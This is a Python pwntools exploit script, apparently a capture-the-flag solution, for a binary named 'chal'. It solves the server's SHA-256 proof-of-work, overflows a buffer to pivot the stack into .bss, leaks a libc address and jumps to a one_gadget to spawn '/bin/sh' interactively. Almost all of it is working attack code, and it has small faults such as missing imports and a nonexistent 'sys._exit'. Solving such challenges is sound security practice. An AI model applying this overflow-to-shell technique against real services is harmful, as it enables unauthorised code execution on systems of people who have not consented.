from pwn import *
import sys

context.log_level = "debug"


# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i)
        for i in __import__("subprocess")
        .check_output(["one_gadget", "--raw", filename])
        .decode()
        .split(" ")
    ]


class NcPowser:
    def __init__(self, difficulty=22, prefix_length=16):
        self.difficulty = difficulty
        self.prefix_length = prefix_length

    def get_challenge(self):
        return (
            secrets.token_urlsafe(self.prefix_length)[: self.prefix_length]
            .replace("-", "b")
            .replace("_", "a")
        )

    def verify_hash(self, prefix, answer):
        h = hashlib.sha256()
        h.update((prefix + answer).encode())
        bits = "".join(bin(i)[2:].zfill(8) for i in h.digest())
        return bits.startswith("0" * self.difficulty)


def solve_pow(prefix, difficulty):
    i = 0
    powser = NcPowser(difficulty=difficulty)
    while not powser.verify_hash(prefix, str(i)):
        i += 1
    return i


if len(sys.argv) == 1:
    r = process("./chal")
    if args.GDB:
        gdb.attach(
            r, "b *0x00000000004011f4\nb *0x00000000004011c5\nb *0x00000000004010d0"
        )
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
    r.recvuntil(b"sha256(")
    pow_prefix = r.recvuntil(b" + ")[:-3].decode()
    r.recvuntil(b"0000000000(")
    pow_difficulty = int(r.recvuntil(b")")[:-1].decode())
    r.recvuntil(b"??? = ")
    print(pow_prefix, pow_difficulty)
    x = solve_pow(pow_prefix, pow_difficulty)
    r.sendline(str(x))
else:
    sys._exit(1)

main_read = 0x4011C5
buf1 = 0x404000 + 0x200
buf2 = buf1 + 0x500
leave_ret = 0x4011F4
ret = 0x40101A
main_puts = 0x4011E7
magic = 0x4010D0
print(f"buf1: {hex(buf1)}")
print(f"buf2: {hex(buf2)}")
r.send(b"A" * 32 + p64(buf1) + p64(main_read))  # stack
r.send(b"A" * 32 + p64(buf2) + p64(main_read))  # buf1
r.send(
    p64(buf1 - 0x10)
    + p64(magic)
    + p64(main_puts)
    + p64(0xDEADBEEF)
    + p64(buf2 - 0x20)
    + p64(leave_ret),
)  # Magic payload
leak = u64(r.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
print(f"leak: {hex(leak)}")
libc = leak - 0x21A780
print(f"libc: {hex(libc)}")
candidate = [965761, 965765, 965768, 965858, 965944, 965951, 965955]
og = libc + candidate[6]
r.send(b"A" * 32 + p64(0x404218 + 0x70) + p64(og))
print("[+] Shell out.")
r.interactive()

"""
Stack pivoting and some trick.
0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
And 0x404218 is somewhere in .bss section and NULL.
"""
